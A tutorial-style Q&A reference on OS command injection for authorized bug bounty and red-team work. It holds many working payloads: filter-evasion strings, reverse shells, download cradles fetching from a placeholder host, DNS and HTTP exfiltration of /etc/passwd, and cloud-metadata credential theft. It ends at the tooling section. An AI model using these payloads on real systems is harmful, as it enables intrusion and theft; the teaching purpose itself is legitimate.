# OS Command Injection — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)

> A complete, in-depth study + field reference for **OS command injection** — from "what is it" to blind exfiltration,
> argument injection, processor RCE, Windows depth, and cloud-takeover chains. Q&A format, progressive difficulty.
> Covers detection (in-band / time / OOB), context-aware breakout, WAF evasion, argument/option injection, special
> sinks (ImageMagick/Ghostscript/ffmpeg/git/tar), Windows (cmd + PowerShell + cradles), exploitation, tooling,
> methodology, real-world patterns, **and** defense.
>
> ⚖️ **Authorized use only.** Everything here is for bug bounty (in-scope), sanctioned pentests, CTFs, and learning.
> Prove RCE with a **benign marker** (`id`/`whoami`/a unique echo or OOB callback), don't run destructive commands,
> don't DoS, **clean up**, and never test systems you don't have written permission to test.

**Canonical references** (cited throughout — real and worth reading in full):
- PortSwigger Web Security Academy — *OS command injection*
- OWASP — *Command Injection* + WSTG "Testing for Command Injection"
- HackTricks — *Command Injection* (+ *Argument Injection*)
- PayloadsAllTheThings — *Command Injection* + *Argument Injection*
- GTFOBins (binary → shell/file-read/exfil), `commixproject/commix`
- CVE-2014-6271 (Shellshock), CVE-2016-3714 (ImageTragick), CVE-2021-22204 (exiftool), CVE-2023-36664 (Ghostscript %pipe%)
- Companion kit in this repo: `Web/CommandInjection/` (guide + arsenal + checklist + report template + `poc/`)

---

## TABLE OF CONTENTS
- **Level 0 — Fundamentals** (Q1–Q8)
- **Level 1 — Finding & confirming injection** (Q9–Q18)
- **Level 2 — Detection: in-band, time, OOB & contexts** (Q19–Q32)
- **Level 3 — WAF / filter / blacklist evasion** (Q33–Q46)
- **Level 4 — Argument injection & special (processor) sinks** (Q47–Q58)
- **Level 5 — Windows command injection** (Q59–Q68)
- **Level 6 — Exploitation, blind exfil & expert chains** (Q69–Q82)
- **Tooling** (Q83–Q87)
- **Black-box methodology & checklist** (Q88–Q91)
- **Cheat sheets** (Q92–Q95)
- **Real-world patterns & references** (Q96–Q97)
- **Defense — preventing command injection** (Q98–Q100)

---

# LEVEL 0 — FUNDAMENTALS

### Q1. What is OS command injection?
A flaw where user input is concatenated into a string that the application passes to an **operating-system shell** (or to a program with shell-style argument parsing), letting an attacker run their own commands on the server. The classic sink: `system("ping " + userHost)` with `userHost = "127.0.0.1; id"` runs `id`. The result is **Remote Code Execution (RCE)** — usually **Critical (CVSS ~9.8)**.

> *Plain version:* the app is like a **clerk dictating a command to a robot that obeys every sentence.** It means to say `ping <your input>`, but you type `127.0.0.1; id`, so the clerk dictates *two* commands and the robot runs both. The `;` is punctuation that ends its command and starts yours. "RCE" (remote code execution) = you can run programs on their server — the top of the severity scale, because from there you reach their files, secrets, database, and cloud account.

### Q2. How is it different from code injection, SSTI, SQLi, and argument injection?
- **OS command injection (CWE-78):** input reaches an OS shell → you run shell commands.
- **Code injection (CWE-94):** input is evaluated by the app's *language* (`eval`) → you run app code (may then call the OS).
- **SSTI (CWE-1336):** input is evaluated by a *template engine* → often reaches code/OS exec (separate kit).
- **SQLi:** input reaches a SQL parser (separate kit).
- **Argument/option injection (CWE-88):** input becomes **one argument** to a program (you can't add a separator) but you can inject **flags** that change the program's behavior (e.g., `curl -o`). Same Critical ceiling via a different mechanism.

### Q3. Why is command injection (almost) always Critical, and why does it pay?
Because "your command runs on the server" = full server compromise: read source/secrets, reach the database, pivot internally, and grab cloud-metadata IAM credentials → cloud takeover. There's rarely a severity debate. It's common in **diagnostic/processing** features (ping/lookup, image/video/doc conversion, archive extraction, git operations, backup/export) that developers wire straight to a shell.

### Q4. Where do command sinks live (features + code)?
- **Features:** network tools (ping/traceroute/nslookup/whois/curl), file **converters** (ImageMagick/ffmpeg/LibreOffice/wkhtmltopdf), **archives** (tar/zip/unzip), backup/export/import, git/svn clone, "run script"/admin diagnostics, PDF/thumbnail generators.
- **Inputs:** query/body params, **filenames**, headers (Host/UA/Referer logged then processed), image EXIF/metadata consumed by a converter.
- **Code sinks (grep):** `system/exec/shell_exec/passthru/popen/proc_open/` backticks (PHP); `os.system/subprocess(shell=True)/os.popen` (Python); `child_process.exec/execSync` (Node); `Runtime.exec/ProcessBuilder` (Java); `Process.Start` (.NET); `%x[]/system/Open3/`backticks (Ruby).

### Q5. What are the three observability classes, and why does blind dominate?
- **In-band:** command output is returned in the response (you see `id`). Easiest.
- **Time-based (blind):** no output, but you can cause a measurable **delay** (`;sleep 10`).
- **OOB (blind):** no output/delay reflected, but the server can make a **DNS/HTTP** request you observe.
Most **real** command injection is **blind** — the app doesn't echo command output. If you only test in-band, you miss the majority. Always run the time and OOB probes.

> *Plain version:* three ways to *tell* the command ran. **In-band** = the app prints the answer back to you (you literally read `whoami`'s output). **Time-based** = it prints nothing, so you order a 10-second nap (`sleep 10`) and watch for the response to arrive 10s late. **OOB** = nothing printed and no useful delay, so you make the server *call a phone number you own* (a DNS/HTTP listener) and check your call log. The trap for beginners: they only look for in-band output, see none, and declare it safe — but the command was running silently the whole time.

### Q6. What's the single most important mindset?
**Prove execution, not a reflected character.** Seeing your `;` or `|` echoed back is *not* a finding. The bug exists only when a command actually **runs** — evidenced by command output, a *repeated* timing delay vs baseline, or a server-sourced OOB callback carrying your marker.

> *Plain version:* the app *displaying* your `;` back on the page proves nothing — that just means it echoed your text, not that a shell ran it. Don't confuse "my weird character showed up" with "a command executed." You only have a bug when you can point to something a command *did*: real output, a reliable delay, or a call to your listener.

### Q7. Which shell metacharacters/operators matter?
`;` (run next), `|` (pipe), `||` (run if previous fails), `&` (background+run next), `&&` (run if previous succeeds), `` `cmd` `` and `$(cmd)` (command substitution), and a **newline** (`%0a`). On Windows: `&`, `&&`, `|`, `||`. These are how you break out of the intended command and append yours.

### Q8. Minimum prerequisites before testing?
HTTP + an intercepting proxy (Burp/Caido), shell basics for the target OS, an **OOB host** (interactsh/Collaborator) — non-negotiable for blind cases — and the ability to send raw requests (curl/Python) to put payloads in params/headers/filenames.

---

# LEVEL 1 — FINDING & CONFIRMING INJECTION

### Q9. How do I find command sinks (recon)?
Look for anything described as "ping/lookup/test/validate URL/trace/whois", any **upload→convert/resize/transcode/thumbnail**, "export PDF/CSV", "backup/restore/import", git clone, and features that put a user-controlled **filename** into processing. Grep JS/source for `exec/system/spawn/Runtime.exec/subprocess`. Also test values that are **logged then processed** (headers, EXIF) → second-order (Q18).

### Q10. What's the first test against a suspected sink?
Baseline, then probe with benign markers across observability classes:
1. In-band: `host=127.0.0.1;echo CMDI-7f3a9` → does `CMDI-7f3a9` appear?
2. Time: `host=127.0.0.1;sleep 10` → ~10s slower (repeat to exclude jitter)?
3. OOB: `host=127.0.0.1;nslookup CMDI.<id>.oast.pro` → DNS hit at interactsh from the server IP?
Whichever fires tells you the class and confirms execution.

### Q11. Why is "I see my `;` reflected" not a finding?
Because reflection ≠ execution. The app may echo your input without ever passing it to a shell. You must demonstrate a command actually ran (Q6). A reflected metacharacter is, at most, a lead to keep probing (time/OOB).

### Q12. What benign markers prove execution for a report?
Deterministic values the app can't produce by itself: `echo CMDI-<rand>`, `$(echo 49)` / `` `expr 7 \* 7` `` → expect `49`, or identity commands `id` / `whoami` / `hostname`. For blind: a `sleep` delay or an OOB callback whose hostname/path carries `$(whoami)`.

### Q13. How do I tell command injection apart from SSRF?
If the server **fetches a URL** you supplied but doesn't run a shell command → that's **SSRF** (separate kit). If your payload makes the server **execute a command** (output/delay/OOB callback triggered by `;cmd`) → command injection. The discriminator is "did a *command* run?" not "did the server make a request?".

> *Plain version:* both can make the server "phone home," so people mix them up. The test: did the server *fetch a web address* (that's SSRF — it only makes HTTP requests where you point it), or did it *run a program* (that's command injection — far more powerful, you run anything)? A DNS callback from `;nslookup x.oob` means a **command** ran; a callback from the server following a URL you gave a "fetch" feature is just SSRF.

### Q14. No output appears — does that mean it's safe?
No. Silence almost always means **blind**, not safe. Run the **time** probe (`;sleep 10`, repeated) and the **OOB** probe (`;nslookup x.oob`) before concluding anything. Blind command injection is the common case.

### Q15. How do I confirm safely (report-grade minimum)?
A single benign marker: in-band `id`/`whoami`/`echo <token>`; blind = a **repeated** `sleep` delay (with a fast baseline) and/or an interactsh hit from the server IP carrying `$(whoami)`. That's a complete Critical. Don't run destructive commands or pivot beyond proof.

### Q16. Reflected metachar vs execution — the rule.
| You have | Verdict |
|---|---|
| `;`/`|` echoed in the response | Nothing yet — not execution |
| `id`/`whoami` output returned | In-band RCE → Critical |
| `;sleep 10` reliably delays (repeated) | Blind RCE → Critical |
| OOB hit from server carrying `$(whoami)` | Blind RCE → Critical |
| Argument injection → file write/RCE | High–Critical |

### Q17. How do I fingerprint the OS quickly?
`;uname` / `;id` (Linux) vs `&ver` / `&echo %OS%` (Windows). Behavior of `;` vs `&`, backslash handling, and whether `sleep` (Linux) vs `timeout`/`ping -n` (Windows) causes a delay also reveal the OS. **If Linux payloads are silent, try Windows ones — it may simply be Windows.**

### Q18. What is second-order (stored) command injection?
Your input is **stored** and consumed later by a backend job/cron/worker (a hostname/path/name field used in a shell command at night). Plant a payload with a unique OOB marker and **watch for a delayed callback from a different (backend) IP**. The worker tier often has broader access → higher impact.

---

# LEVEL 2 — DETECTION: IN-BAND, TIME, OOB & CONTEXTS

### Q19. How does in-band detection work?
Break out of the intended command and append yours, then read the output:
```
127.0.0.1; id      127.0.0.1| id      127.0.0.1|| id      127.0.0.1 & id      127.0.0.1 && id
`id`     $(id)      127.0.0.1%0aid     "; id; "     '; id; '
```
Confirm with a deterministic marker (`echo CMDI-7f3a9`, `$(echo 49)`).

### Q20. Give me the Linux operator table.
- `;` run next regardless · `|` pipe stdout · `||` run if previous **failed** · `&` background then run next · `&&` run if previous **succeeded** · `` `cmd` ``/`$(cmd)` command substitution · newline (`%0a`/`\n`) separates commands. If `;`/`&&` are filtered, try `|`, `` ` ``/`$()`, or `%0a`.

### Q21. Why is command substitution (`` ` `` / `$()`) so useful?
It runs a command **inside** another command's arguments, so it often works where separators are stripped — e.g. `ping $(id)` or `ping \`id\``. Great when a filter removes `;`/`&` but leaves backticks/`$()`.

### Q22. Newline injection (`%0a`)?
A literal newline is a command separator in most shells **regardless of quoting**, so `%0a id` frequently bypasses filters that block `;`/`&` and even survives some quote contexts. Always try `%0a` (and `%0d%0a`).

### Q23. Why does the injection *context* matter (quotes/parens)?
Where your input lands decides what you must emit first to break out. If it's inside `"…"` you must close the `"`; inside `'…'` you must close the `'` (and `$()`/`` ` `` don't expand inside single quotes until you close them); inside `$()` you must balance parens. Getting the context right is why a "filtered" target still pops.

> *Plain version:* the app might wrap your input in quotes — `ping "<you>"`. Your `;id` is now *inside* the quotes, treated as part of the hostname, so nothing runs. You first have to **close the quote** the app opened (`127.0.0.1"; id; "`) so your command lands outside it. It's like the app put your words in air-quotes; you have to "un-air-quote" before the shell treats them as a command. Single quotes are stricter — `$()` and backticks stay inert until you close the `'`.

### Q24. How do I find which quote I'm inside?
Send `127.0.0.1'` and `127.0.0.1"` **separately**. Whichever causes a shell/parse error (or changes behavior) tells you the quote you're in. Then prepend the matching closer:
```
double:  127.0.0.1"; id; "      or  127.0.0.1"; id #
single:  127.0.0.1'; id; '      or  127.0.0.1'$(id)'
inside backtick:  ` ; id ; `      inside $( ):  ) ; id ; echo $(
escaped/stripped quotes: fall back to %0a, or to argument injection (Q47).
```

### Q25. How does time-based detection work, and how do I exclude jitter?
Make the server wait and measure it: `;sleep 10`, `` `sleep 10` ``, `||sleep 10`, or `ping -c 10 127.0.0.1`. Compare against a fast baseline and **repeat 2–3×** — a *single* slow response is jitter, not proof. Use a distinctive delay (e.g. 7s) so it's unmistakable.

### Q26. How do I extract data with time alone (boolean)?
Conditional sleeps reveal one bit/char at a time:
```
;if [ "$(whoami|cut -c1)" = "r" ]; then sleep 8; fi      → first char of whoami is 'r'?
```
Binary-search each character (or compare ASCII ranges) to recover a value slowly. It's a last resort — OOB exfil (Q27/Q71) is far faster.

### Q27. How does OOB detection work, and why is DNS the best channel?
Make the server reach **your** host: `;nslookup CMDI.<id>.oast.pro` (DNS) or `;curl http://<id>.oast.pro/CMDI` (HTTP). A hit at interactsh from the **server IP** confirms blind execution. **DNS often escapes egress filters that block outbound HTTP**, so it's the most reliable confirmation and exfil channel.

> *Plain version:* you run a free listener (interactsh/Collaborator) that gives you a unique address like `abc.oast.pro` and logs anyone who contacts it. Inject `nslookup abc.oast.pro` — a DNS lookup — and if your log shows a hit *from the target's IP*, the command ran. Why DNS over HTTP? Firewalls routinely block servers from making outbound web requests but almost always allow DNS lookups (the internet breaks without them), so a DNS callback sneaks out where an HTTP one wouldn't.

### Q28. How do I set up an OOB listener?
Run `interactsh-client -v` (it prints your unique `*.oast.pro` host and logs DNS+HTTP with source IP), or use **Burp Collaborator**. Put the unique host in your payloads; poll for interactions. (See the kit's `poc/oob_listen.md`.)

### Q29. How do I make sure an OOB hit is really from my injection?
Use a **unique token** per payload (so the hit maps to a specific test), and verify the **source IP is the target server** (not your own resolver or a scanner). DNS-only confirmation from the server IP, tied to your token, is solid evidence; strengthen it by exfiltrating `$(whoami)` (Q71).

### Q30. Can I inject via headers / User-Agent / filenames?
Yes. Any value that reaches a shell is a sink: `User-Agent`/`Referer`/`X-Forwarded-For` (logged then processed — also the Shellshock vector), an uploaded **filename** passed to `convert <name>`, or EXIF metadata consumed by a converter. Test these, not just obvious params.

### Q31. GraphQL / JSON / API contexts — anything different?
Same metacharacters; just place them in the JSON value / GraphQL variable. Watch content-type handling (some APIs decode differently). The injection point is wherever the value ends up in a server-side command.

### Q32. How do I build a detection oracle for automation?
For each payload, check: (a) the marker string in the response (in-band), (b) a **consistent** response-time delta over repeats (time), or (c) an interactsh interaction keyed to the payload's unique token (OOB). Without a real oracle you drown in false positives — exactly what gets reports closed.

---

# LEVEL 3 — WAF / FILTER / BLACKLIST EVASION

### Q33. A WAF/blacklist blocks my payloads — is that the end?
No. Filtered command injection is still Critical once you evade. Route around the specific block: spaces, keywords, separators, slashes — each has a canonical bypass. Work one layer at a time and combine.

### Q34. Spaces are blocked — how do I run `cat /etc/passwd`?
> *Plain version:* the filter bans the space character, but the shell has other ways to read "gap between words." `${IFS}` is a built-in variable that *is* whitespace (Internal Field Separator), so `cat${IFS}/etc/passwd` runs exactly like `cat /etc/passwd` — no literal space typed. Brace expansion `{cat,/etc/passwd}` and input-redirection `<` are alternate no-space forms. Same command, different spelling, invisible to a "no spaces" rule.

```
cat${IFS}/etc/passwd        cat$IFS$9/etc/passwd        {cat,/etc/passwd}        cat</etc/passwd
X=$'\t';cat${X}/etc/passwd  (use a tab via a var)        %09 (tab) in the request
```
`${IFS}` (the shell's internal field separator) is the classic space replacement.

### Q35. A keyword (e.g. `whoami`/`cat`) is blocked — how do I rebuild it?
Split it so the filter's literal match fails but the shell still resolves it:
```
c''at /etc/passwd     c\at /etc/passwd     "c"at /etc/passwd     ca''t     w'h'o'a'm'i     w\ho\am\i     who$@ami
```

### Q36. What is globbing evasion?
Use wildcards so you never type the literal binary/path name: `/???/c?t /etc/passwd`, `/bin/c?t /e??/p?ssw?`, `/???/?????32` (Windows). The shell expands the glob to the real path.

### Q37. Encoding-based evasion?
When everything is filtered, decode-and-pipe:
```
echo d2hvYW1p|base64 -d|bash        printf '\167\150\157\141\155\151'|sh        $(printf whoami)
echo -e '\x77\x68\x6f\x61\x6d\x69'|sh        bash<<<$(base64 -d<<<d2hvYW1p)
```

### Q38. Separator swaps?
If `;` is blocked: `|`, `||`, `&&`, `&`, `%0a`, `` `cmd` ``, `$(cmd)`, `$IFS`. One of these almost always survives a partial blacklist.

### Q39. Slash filters?
Build `/` without typing it: `${HOME:0:1}` (=`/`), `${PATH:0:1}`, or `$(echo . | tr '.' '/')`. Useful when paths are filtered.

### Q40. Case / variable-expansion tricks?
`$(tr A-Z a-z<<<WHOAMI)`, `${IFS%??}`, case variants where the handler is case-insensitive but the blacklist isn't. Variable expansion (`${...}`) hides literal strings from naive filters.

### Q41. Comment / control-char splitting?
Trailing `//`/`#` to comment out the rest of the original command; control chars or nested tokens to defeat naive string-stripping. (Mostly useful to neutralize trailing args the app appends.)

### Q42. How do I combine evasion layers?
Stack them: `{cat,/e?c/p?sswd}` (brace + glob), `c\at${IFS}/etc/pass\wd` (backslash + IFS), `echo <b64>|base64 -d|bash` (encode + pipe). Add the right **separator/quote breakout** (Level 2) as the outer layer.

### Q43. What if the WAF inspects the body but not other inputs?
**Move the injection** to a different injection point the WAF may not inspect — a header, a JSON field, a path segment, a filename, or a second-order stored value. Many WAFs only deeply inspect obvious params.

### Q44. Double-encoding / normalization mismatch?
If the stack decodes input more than once (or the WAF decodes once and the app twice), double-encode metacharacters (`%253b` → `%3b` → `;`) so the payload is benign when the WAF sees it but live when the shell does.

### Q45. How do I defeat signature detection on the command itself (e.g. "whoami" flagged)?
Rebuild the command from pieces so no signatured substring appears: quote/backslash splitting (`w\ho\am\i`), globbing (`/???/?h?am?` → `whoami`), `printf`/base64 reconstruction, or environment substring (Windows, Q62). The shell resolves it; the signature doesn't match.

### Q46. Which tools help fuzz the evasion space?
`commix` (with `--level`), Burp Intruder/Turbo Intruder over a separator+evasion wordlist, and the kit's `poc/evasion.py` (builds `${IFS}`/quote/encode/glob variants of a command). Always confirm a hit by hand with a benign marker.

---

# LEVEL 4 — ARGUMENT INJECTION & SPECIAL (PROCESSOR) SINKS

### Q47. What is argument/option injection (CWE-88)?
When your input becomes a **single argument** to a program (not the whole command), so you can't add a separator — **but you can inject flags** that change the program's behavior. The program does exactly what its options say, so a "safe" parameterized exec can still become file-write/SSRF/RCE.

> *Plain version:* sometimes the developer did it "safely" — your input is handed to one program as a single word, with no shell to break, so `;` is dead. But every command-line program obeys its own **flags** (words starting with `-`). If your input *becomes* a flag, the program does what the flag says. Feed `curl` a `-o` and it writes a file instead of downloading; feed `tar` a `--checkpoint-action=exec=` and it runs a command. You're not breaking out of a sentence — you're reprogramming the one tool you're allowed to talk to. (CWE-88, the "sneaky sibling" of classic command injection.)

### Q48. When does it apply?
When the sink is `exec(["tool", userInput])` / `tool $userInput` with separators escaped or stripped, **and** the value can start with `-` (or you can sneak one in). Identify the tool (from errors/behavior/source) and reach for its dangerous options.

### Q49. curl argument injection?
```
-o /var/www/html/shell.php http://YOUR_IP/shell.php    # write a web shell → RCE
--upload-file /etc/passwd http://YOUR_IP/              # exfil a file
-K http://YOUR_IP/curlrc                               # load a remote config (more flags)
```

### Q50. tar argument injection?
```
--checkpoint=1 --checkpoint-action=exec=sh\ -c\ id     # tar runs a command
--use-compress-program='sh -c id'  /  -I /bin/sh -c id
--to-command='sh -c id'
```
Reached anywhere a user-controlled filename/arg flows into `tar`.

### Q51. git argument injection?
```
git clone "ext::sh -c id" x        # ext:: transport runs a command
--upload-pack='`id`'   -c core.sshCommand='id'
# also: a cloned repo's hooks (post-checkout/pre-commit) run on checkout → RCE
```

### Q52. Other tools worth knowing (wget/zip/rsync/ssh/find/sed/awk)?
```
wget:  --use-askpass=/bot.sh  -O /path  --post-file=/etc/passwd http://YOUR_IP/
zip:   -T --unzip-command 'sh -c id'
rsync/ssh:  -e 'sh -c id'  --rsh='sh -c id'  -o ProxyCommand='sh -c id'
find:  -exec id \;     sed: s/x/y/e (GNU)     awk 'BEGIN{system("id")}'
```

### Q53. ImageMagick "ImageTragick" (CVE-2016-3714)?
Many apps resize/convert uploads with ImageMagick. A crafted MVG/MSL/SVG abuses **delegate** commands (`url`/`https`/`ephemeral`/`|`) → RCE on processing. Upload an image that triggers a delegate and pings your collaborator. (Cross-ref the FileUpload kit to get the file accepted.)

> *Plain version:* ImageMagick is the library tons of sites use to resize your uploaded photo. To handle certain formats it shells out to helper programs ("delegates") — and in 2016 someone realised a booby-trapped image file could smuggle a command into that shell-out (nicknamed "ImageTragick"). So a totally normal "upload a profile picture" feature became RCE, with no visible command box anywhere. That's why any *upload → convert* feature is a command-injection suspect, not just ping/lookup boxes.

### Q54. Ghostscript RCE?
PDF/EPS/PS rendering (often via ImageMagick's PDF delegate) hits Ghostscript. `-dSAFER` bypasses and `%pipe%` (CVE-2018-16509, CVE-2023-36664) → RCE when a document is converted/thumbnailed. Match the version to the PoC; prove with a benign OOB curl.

### Q55. ffmpeg as a sink?
A crafted `.m3u8` (HLS) / `.avi` makes ffmpeg read a local file or hit an internal URL and embed the result in the transcoded output → **server-side file read + SSRF** on any "convert your video" feature; some builds → RCE.

### Q56. exiftool (CVE-2021-22204)?
A crafted DjVu metadata payload achieves **RCE** when the server runs `exiftool` on an upload (extremely common in image pipelines). Keep the embedded command benign (an OOB ping); confirm via callback only.

### Q57. What is GTFOBins and how does it help after exec?
GTFOBins (gtfobins.github.io) lists how a "limited" binary becomes a shell / file read / exfil. Once you have command exec (even constrained), escalate: `awk 'BEGIN{system("/bin/sh")}'`, `find . -exec /bin/sh \;`, `vi -c ':!sh'`, `env /bin/sh`, `python -c 'import os;os.system("/bin/sh")'`, `git -p help`→`!sh`, plus SUID/sudo abuse (`sudo -l`, `find / -perm -4000`).

### Q58. Language-specific sinks to recognize?
PHP `system/exec/shell_exec/passthru/popen/proc_open/`backticks; Python `os.system/subprocess(shell=True)/os.popen` (+ `pickle`/`yaml.load` → code-exec); Node `child_process.exec/execSync` (+ `spawn(...,{shell:true})`); Java `Runtime.exec/ProcessBuilder` (+ Groovy/SpEL eval); Ruby `system/%x[]/`backticks`/Open3` (+ `Kernel.open("|cmd")`); .NET `Process.Start`. Knowing the sink tells you what's possible and how to escalate.

---

# LEVEL 5 — WINDOWS COMMAND INJECTION

### Q59. How is Windows command injection different?
Different shell semantics. Most "Linux didn't work" cases are **Windows targets**. `sh` operators/`sleep` do nothing; use `cmd.exe`/PowerShell syntax. Detect with `&ver` / `&echo %OS%` (cmd) and `;$PSVersionTable` (PowerShell). Comments are `::`/`rem` (not `#`), and `%VAR%` expands at parse time.

> *Plain version:* Windows speaks a different command language than Linux, so Linux payloads (`;id`, `sleep`) silently do nothing — and beginners wrongly quit. Before concluding "not vulnerable," try the Windows dialect: `&whoami`, `&ver` (its version banner), `& ping -n 10 127.0.0.1` (its way to make a 10s delay). If those fire, it's Windows and you just needed the right words.

### Q60. cmd.exe separators?
`&` (run next), `&&` (run if previous succeeded), `|` (pipe), `||` (run if previous failed — great for blind on a bad host). E.g. `127.0.0.1 & whoami`, `127.0.0.1 || whoami`.

### Q61. cmd escaping (`^`) and token-splitting (`""`)?
`^` escapes the next character, defeating some filters: `w^h^o^a^m^i`. Empty quotes split a token without changing it: `who""ami`, `"wh"o"am"i`. Both evade naive keyword blacklists.

### Q62. Environment-variable substring to rebuild a blocked word?
Slice existing env vars to assemble a string without typing it: `%COMSPEC:~-7,3%` extracts characters of `C:\…\cmd.exe`. Or set a var and slice it: `set x=who&&set y=ami&&cmd /v:on /c "echo !x!!y!"` (delayed expansion).

### Q63. FOR loops / DOSfuscation / delayed expansion?
`for /f %i in ('whoami') do @echo %i` runs and captures output while obfuscating the command. `cmd /v:on` enables `!VAR!` delayed expansion for run-time string building. These are the Windows analog of Linux quoting/IFS tricks.

### Q64. PowerShell: IEX, encoded commands, IWR?
```
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/s.ps1')"
powershell -enc <base64-UTF16LE>     # encoded command — bypasses quote/space filters entirely
powershell IWR http://YOUR_IP/s.ps1 -OutFile s.ps1; .\s.ps1
```
Encode with `[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))`.

### Q65. Download cradles (get a payload onto the box)?
```
certutil -urlcache -split -f http://YOUR_IP/s.exe %TEMP%\s.exe & %TEMP%\s.exe
bitsadmin /transfer j http://YOUR_IP/s.exe %TEMP%\s.exe & %TEMP%\s.exe
curl http://YOUR_IP/s.exe -o %TEMP%\s.exe & %TEMP%\s.exe   (curl ships in modern Win10/11)
powershell IWR http://YOUR_IP/s.ps1 -OutFile s.ps1; .\s.ps1
```
For bug bounty a single `whoami`/`echo` marker is enough — cradles are for authorized red-team.

### Q66. Windows OOB / exfil?
```
& nslookup %COMPUTERNAME%.YOUR.oast.fun
& powershell Resolve-DnsName $env:USERNAME.YOUR.oast.fun
& curl http://YOUR.oast.fun/$(whoami)     (PowerShell: "$(whoami)")
```
The DNS hit confirms blind exec and carries `%COMPUTERNAME%`/`%USERNAME%` as proof.

### Q67. cmd vs PowerShell quirks to remember?
cmd comments are `::`/`rem` (not `#`); `%VAR%` expands at parse time, `!VAR!` with delayed expansion; `^` is the escape char. PowerShell uses `;`/`|`, `$()` substitution, `"$(...)"` interpolation, and `-enc` for encoded commands. Pick payloads for the right shell.

### Q68. How do I know it's Windows when Linux payloads are silent?
Don't assume "not vulnerable." Try `&ver`, `&echo %OS%`, `&whoami`, and a Windows time probe (`& ping -n 10 127.0.0.1` / `& timeout 10`). If those produce output/delay/OOB, it's Windows and you simply used the wrong syntax.

---

# LEVEL 6 — EXPLOITATION, BLIND EXFIL & EXPERT CHAINS

### Q69. How do I go from command exec to an interactive shell?
After a benign marker confirms RCE, (authorized red-team only) use a reverse shell to a listener (`nc -lvnp 4444`):
```
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
Windows: powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('YOUR_IP',4444);..."   (full one-liner in the kit arsenal)
```
Use the kit's `poc/revshell.py` to generate + URL-encode.

### Q70. Bug-bounty proof vs red-team shell — what's enough?
For **bug bounty**, a single `id`/`whoami` (or an OOB callback carrying `$(whoami)`) is a **complete Critical** — you do **not** need a reverse shell. For an authorized **red-team** engagement, escalate to a shell, pivot read-only, and clean up.

### Q71. How do I exfiltrate data blind via DNS?
Put command output in the callback hostname; chunk for DNS label limits (63 chars/label, 253 total):

> *Plain version:* a bare "the server called my listener" is proof it ran *something* — but you can do better and make the call *carry the answer*. `$(whoami)` runs first and its output becomes part of the hostname looked up: `nslookup $(whoami).oob` turns into a lookup for `root.oob`, so your log now literally shows the server's username. For bigger data (a whole file), base64-encode it and split into ≤63-character chunks (DNS's max label size) across several lookups, then reassemble and decode on your side.

```
;nslookup $(whoami).YOUR.oast.fun
;for c in $(cat /etc/passwd|base64|tr -d '='|fold -w60); do nslookup $c.YOUR.oast.fun; done
```
Decode the base64 labels on your side. DNS escapes most egress filters.

### Q72. Blind exfil via HTTP / timing?
HTTP (if egress allowed): `;curl -s http://YOUR.oast.fun/?d=$(id|base64)` or `--data-binary @/etc/passwd`. Timing (last resort, 1 bit at a time): conditional `sleep` on a boolean (Q26). Prefer DNS/HTTP — timing is slow and noisy.

### Q73. Post-RCE — how do I prove impact and pivot (safely)?
Prove with `id`/`whoami`/`hostname` or a unique marker. Pivot (authorized, read-only): read app config/.env → creds (validate read-only, redact); read cloud metadata from the box; read the k8s SA token; map internal hosts. **Clean up** anything you wrote. For bounty, `id` and stop.

### Q74. Chain: command injection → cloud takeover?
From the shell, `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → temporary IAM creds → `aws sts get-caller-identity` to prove they're live (read-only) → cloud-account compromise. (ECS/Lambda variants at `169.254.170.2`.) Cross-ref the SSRF kit's metadata discipline; stop at proof.

### Q75. Chain: command injection → container/k8s escape?
Read `/var/run/secrets/kubernetes.io/serviceaccount/token` → call the k8s API; check for a privileged container, mounted Docker socket (`/var/run/docker.sock`), or host mounts → escape to the node. (Authorized engagements; read-only for the report.)

### Q76. Chain: reach a command sink via SSRF/LFI/file-upload?
If the command sink is internal-only, use **SSRF** to reach it, **LFI** to include a poisoned file that execs, or **file upload** to drop a payload a processor runs (ImageMagick/ffmpeg). The injection is the same; the delivery changes. JS recon often reveals the exact internal endpoint.

### Q77. Second-order exploitation?
Plant a payload in a stored field (hostname/path/name) that a **backend worker** later passes to a shell. The callback comes from the worker tier (different IP), which frequently has broader cloud/internal access → higher impact than the front-end sink.

### Q78. How do I reach internal-only command sinks?
Via the chains above (SSRF/LFI/upload), via an authenticated admin/ops feature, or by smuggling past a front-end (Request-Smuggling kit). Once reached, the same detection/exploitation applies.

### Q79. How do real attackers persist after command-injection RCE (defensive awareness)?
(Out of scope for bounty — stop at proof.) Dropping a stealth web shell, adding a cron/scheduled task, modifying a served file, or planting SSH keys. Detection: file-integrity monitoring, egress/OAST-callback monitoring, alerting on new executables and on access logs hitting endpoints with `?c=`/`?cmd=`.

### Q80. How do I escalate a "weak"/blind finding into something that pays?
A reflected metachar → run time + OOB probes to confirm execution. A confirmed blind desync → **exfiltrate** `$(whoami)`/`$(hostname)`/a secret file so the PoC carries real output. Argument injection → write a web shell / read a file. A processor sink → fire its CVE. Always push to demonstrated RCE (or read of a real secret) within scope.

### Q81. What are the do-no-harm rules?
Benign markers only (`id`/`echo`/OOB `$(whoami)`); no destructive commands (`rm`, shutdown, fork bombs); no DoS (`sleep 999`); read the minimum to prove impact; validate creds read-only; **remove anything you wrote** and don't leave a persistent shell on a bug-bounty target.

### Q82. What separates an expert from a beginner here?
The expert (1) always tests **blind** (time + OOB), not just in-band; (2) nails the **injection context** (quote/paren breakout); (3) **evades** WAFs methodically (IFS/quoting/encoding/globbing) and knows **Windows** depth; (4) recognizes **argument injection** and **processor** sinks; (5) **exfiltrates** blind output and **chains** to cloud/internal; and (6) proves it with one benign marker, excludes jitter, and cleans up.

---

# TOOLING

### Q83. Core command-injection toolkit?
- **Burp/Caido** (Repeater + Intruder/Turbo Intruder) — tamper params/headers/body.
- **interactsh / Burp Collaborator** — OOB confirmation + DNS/HTTP exfil (essential for blind).
- **commix** — automated detection/exploitation (verify by hand).
- **GTFOBins** — limited-binary → shell escalation.
